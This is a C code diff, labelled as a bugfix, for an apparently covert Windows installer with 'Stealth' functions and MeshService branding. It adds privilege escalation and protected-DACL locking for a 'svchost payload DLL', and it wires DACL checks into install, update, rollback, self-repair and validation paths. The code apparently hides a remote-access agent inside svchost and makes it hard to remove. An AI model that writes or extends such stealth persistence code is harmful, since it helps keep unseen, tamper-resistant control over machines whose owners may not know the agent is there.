@@ -354,6 +354,7 @@ typedef struct StealthLifecycleDiscovery
     BOOL installRootDaclValid;
     BOOL logsDirDaclValid;
     BOOL exeDaclValid;
+    BOOL dllDaclValid;
     BOOL configKeysValid;
     BOOL serviceKeyExists;
     BOOL serviceExists;
@@ -1503,6 +1504,52 @@ static BOOL Stealth_HardenHostExecutableDacl(const wchar_t* exePath)
     return ok;
 }
 
+// BUGFIX: Add DLL hardening function to fix "Access Denied" when rundll32 runs as USER
+static BOOL Stealth_HardenSvchostDllDacl(const wchar_t* dllPath)
+{
+    if (dllPath == NULL || dllPath[0] == L'\0') { return FALSE; }
+    if (GetFileAttributesW(dllPath) == INVALID_FILE_ATTRIBUTES) { return FALSE; }
+
+    Stealth_EnablePrivilege(L"SeTakeOwnershipPrivilege");
+    Stealth_EnablePrivilege(L"SeSecurityPrivilege");
+    Stealth_EnablePrivilege(L"SeBackupPrivilege");
+    Stealth_EnablePrivilege(L"SeRestorePrivilege");
+
+    PSECURITY_DESCRIPTOR pSD = NULL;
+    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
+        STEALTH_SVCHOST_DLL_DACL_SDDL, SDDL_REVISION_1, &pSD, NULL))
+    {
+        return FALSE;
+    }
+
+    PACL dacl = NULL;
+    BOOL daclPresent = FALSE;
+    BOOL daclDefaulted = FALSE;
+    BOOL ok = FALSE;
+
+    if (GetSecurityDescriptorDacl(pSD, &daclPresent, &dacl, &daclDefaulted) &&
+        daclPresent && dacl != NULL)
+    {
+        DWORD setResult = SetNamedSecurityInfoW(
+            (LPWSTR)dllPath,
+            SE_FILE_OBJECT,
+            DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
+            NULL, NULL, dacl, NULL);
+        if (setResult == ERROR_SUCCESS)
+        {
+            ok = TRUE;
+            Stealth_LogInstallEvent(L"Hardened svchost DLL DACL: %ls", dllPath);
+        }
+        else
+        {
+            SetLastError(setResult);
+        }
+    }
+
+    LocalFree(pSD);
+    return ok;
+}
+
 static void Stealth_LogAnsiMessage(const char* message)
 {
     if (message == NULL || message[0] == '\0') { return; }
@@ -2219,6 +2266,12 @@ static BOOL Stealth_AttemptSvchostStartupRepair(const wchar_t* serviceName, cons
         return FALSE;
     }
 
+    // Harden DLL DACL immediately after creation
+    if (!Stealth_HardenSvchostDllDacl(dllPath))
+    {
+        Stealth_LogInstallEvent(L"Warning: DLL DACL hardening failed for %ls (error=%lu)", dllPath, GetLastError());
+    }
+
     if (!Stealth_ValidateSvchostPayloadDll(dllPath))
     {
         Stealth_LogInstallEvent(L"Svchost self-repair failed: payload validation failed after restage (%ls)", dllPath);
@@ -2788,6 +2841,11 @@ static BOOL Stealth_CommitUpdateTransaction(const StealthInstallPaths* paths, co
         Stealth_LogInstallEvent(L"[UPDATE] Failed to commit staged svchost DLL to %ls", paths->dllPath);
         return FALSE;
     }
+    if (!Stealth_HardenSvchostDllDacl(paths->dllPath))
+    {
+        Stealth_LogInstallEvent(L"[UPDATE] Failed to apply svchost DLL DACL to %ls", paths->dllPath);
+        return FALSE;
+    }
     if (!Stealth_ValidateSvchostPayloadDll(paths->dllPath))
     {
         Stealth_LogInstallEvent(L"[UPDATE] Committed svchost DLL failed validation (%ls)", paths->dllPath);
@@ -2829,6 +2887,14 @@ static BOOL Stealth_RollbackUpdateTransaction(const StealthInstallPaths* paths, 
         if (!Stealth_HardenHostExecutableDacl(paths->exePath))
         {
             Stealth_LogInstallEvent(L"[UPDATE] Failed to restore host executable DACL during rollback (%ls)", paths->exePath);
+            ok = FALSE;
+        }
+    }
+    if (ok && paths->dllPath[0] != L'\0' && GetFileAttributesW(paths->dllPath) != INVALID_FILE_ATTRIBUTES)
+    {
+        if (!Stealth_HardenSvchostDllDacl(paths->dllPath))
+        {
+            Stealth_LogInstallEvent(L"[UPDATE] Failed to restore svchost DLL DACL during rollback (%ls)", paths->dllPath);
             ok = FALSE;
         }
     }
@@ -3817,6 +3883,7 @@ typedef struct StealthValidationSummary
     BOOL exePresent;
     BOOL exeDacl;
     BOOL dllPresent;
+    BOOL dllDacl;
     BOOL configPresent;
     BOOL configKeys;
     BOOL serviceExists;
@@ -4043,6 +4110,11 @@ static BOOL Stealth_ValidateInstallRootDacl(const wchar_t* path)
 static BOOL Stealth_ValidateHostExecutableDacl(const wchar_t* exePath)
 {
     return Stealth_ValidatePathDaclWithExpected(exePath, STEALTH_HOST_EXE_DACL_SDDL);
+}
+
+static BOOL Stealth_ValidateSvchostDllDacl(const wchar_t* dllPath)
+{
+    return Stealth_ValidatePathDaclWithExpected(dllPath, STEALTH_SVCHOST_DLL_DACL_SDDL);
 }
 
 static const wchar_t* Stealth_LifecycleStateToString(StealthLifecycleStateKind stateKind)
@@ -4400,6 +4472,7 @@ static BOOL Stealth_IsPrimaryLifecycleConverged(const StealthLifecycleDiscovery*
                                     discovery->installRootDaclValid &&
                                     discovery->logsDirDaclValid &&
                                     discovery->exeDaclValid &&
+                                    discovery->dllDaclValid &&
                                     discovery->configKeysValid);
     const BOOL serviceHealthy = (discovery->serviceExists &&
                                  discovery->serviceKeyExists &&
@@ -4561,6 +4634,7 @@ static BOOL Stealth_DiscoverCurrentState(StealthLifecycleDiscovery* discovery)
     discovery->installRootDaclValid = (discovery->installRootExists ? Stealth_ValidateInstallRootDacl(discovery->paths.installDir) : FALSE);
     discovery->logsDirDaclValid = (discovery->logsDirExists ? Stealth_ValidatePathDacl(discovery->paths.logsDir) : FALSE);
     discovery->exeDaclValid = (discovery->exeExists ? Stealth_ValidateHostExecutableDacl(discovery->paths.exePath) : FALSE);
+    discovery->dllDaclValid = (discovery->dllExists ? Stealth_ValidateSvchostDllDacl(discovery->paths.dllPath) : FALSE);
     discovery->configKeysValid = (discovery->confExists ? Stealth_ConfigHasRequiredKeys(discovery->paths.confPath) : FALSE);
 
     HKEY serviceKey = NULL;
@@ -5031,6 +5105,11 @@ static BOOL Stealth_TryStageAndValidateSvchostDll(const wchar_t* candidatePath, 
     {
         if (Stealth_ValidateSvchostPayloadDll(destPath))
         {
+            if (!Stealth_HardenSvchostDllDacl(destPath))
+            {
+                Stealth_LogInstallEvent(L"Failed to harden svchost DLL DACL in place (%ls, error=%lu)", destPath, GetLastError());
+                return FALSE;
+            }
             return TRUE;
         }
         Stealth_LogInstallEvent(L"Svchost DLL candidate failed validation in place (%ls)", candidatePath);
@@ -5041,6 +5120,13 @@ static BOOL Stealth_TryStageAndValidateSvchostDll(const wchar_t* candidatePath, 
     if (!Stealth_CopyFileOverwrite(candidatePath, destPath))
     {
         Stealth_LogInstallEvent(L"Failed to stage svchost DLL from %ls (%ls -> %ls)", sourceLabel != NULL ? sourceLabel : L"candidate", candidatePath, destPath);
+        return FALSE;
+    }
+
+    if (!Stealth_HardenSvchostDllDacl(destPath))
+    {
+        Stealth_LogInstallEvent(L"Failed to harden staged svchost DLL DACL from %ls (%ls, error=%lu)", sourceLabel != NULL ? sourceLabel : L"candidate", destPath, GetLastError());
+        Stealth_DeleteFileIfPresent(destPath);
         return FALSE;
     }
 
@@ -5129,9 +5215,19 @@ static BOOL Stealth_EnsureSvchostDllFile(const wchar_t* sourceExePath, const wch
         }
 
         Stealth_DeleteFileIfPresent(destPath);
-        if (Stealth_ExtractEmbeddedSvchostDllFromExe(sourceExePath, destPath) && Stealth_ValidateSvchostPayloadDll(destPath))
+        if (Stealth_ExtractEmbeddedSvchostDllFromExe(sourceExePath, destPath))
         {
-            return TRUE;
+            if (!Stealth_HardenSvchostDllDacl(destPath))
+            {
+                Stealth_LogInstallEvent(L"Failed to harden extracted svchost DLL DACL (%ls, error=%lu)", destPath, GetLastError());
+                Stealth_DeleteFileIfPresent(destPath);
+                return FALSE;
+            }
+            if (Stealth_ValidateSvchostPayloadDll(destPath))
+            {
+                return TRUE;
+            }
+            Stealth_DeleteFileIfPresent(destPath);
         }
 
         MeshService_CopyBrandingTextToWide(MeshService_GetSvchostDllNameText(), brandedDllName, _countof(brandedDllName));
@@ -5162,6 +5258,13 @@ static BOOL Stealth_EnsureSvchostDllFile(const wchar_t* sourceExePath, const wch
         Stealth_LogInstallEvent(L"Failed to stage embedded svchost payload to %ls (error=%lu)", destPath, GetLastError());
         return FALSE;
     }
+
+    // BUGFIX: Harden DLL DACL immediately after creation
+    if (!Stealth_HardenSvchostDllDacl(destPath))
+    {
+        Stealth_LogInstallEvent(L"Warning: DLL DACL hardening failed for %ls (error=%lu)", destPath, GetLastError());
+    }
+
     if (!Stealth_ValidateSvchostPayloadDll(destPath))
     {
         Stealth_DeleteFileIfPresent(destPath);
@@ -5442,6 +5545,7 @@ static void Stealth_PrintValidationJson(const StealthValidationSummary* summary)
     printf("\"exePresent\":%s,", summary->exePresent ? "true" : "false");
     printf("\"exeDacl\":%s,", summary->exeDacl ? "true" : "false");
     printf("\"dllPresent\":%s,", summary->dllPresent ? "true" : "false");
+    printf("\"dllDacl\":%s,", summary->dllDacl ? "true" : "false");
     printf("\"configPresent\":%s,", summary->configPresent ? "true" : "false");
     printf("\"configKeys\":%s,", summary->configKeys ? "true" : "false");
     printf("\"serviceExists\":%s,", summary->serviceExists ? "true" : "false");
@@ -5504,6 +5608,7 @@ static BOOL Stealth_RunInstallValidationInternal(const char* phase)
     summary.installRootDacl = (summary.installRoot ? Stealth_ValidateInstallRootDacl(paths.installDir) : FALSE);
     summary.logsRootDacl = (summary.logsRoot ? Stealth_ValidatePathDacl(paths.logsDir) : FALSE);
     summary.exeDacl = (summary.exePresent ? Stealth_ValidateHostExecutableDacl(paths.exePath) : FALSE);
+    summary.dllDacl = (summary.dllPresent ? Stealth_ValidateSvchostDllDacl(paths.dllPath) : FALSE);
 
     if (!summary.installRoot)
     {
@@ -5538,6 +5643,11 @@ static BOOL Stealth_RunInstallValidationInternal(const char* phase)
     if (!summary.dllPresent)
     {
         Stealth_LogInstallEvent(L"[VALIDATION] Service DLL missing: %ls", paths.dllPath);
+        summary.success = FALSE;
+    }
+    else if (!summary.dllDacl)
+    {
+        Stealth_LogInstallEvent(L"[VALIDATION] Service DLL DACL mismatch: %ls", paths.dllPath);
         summary.success = FALSE;
     }
     if (!summary.configPresent)
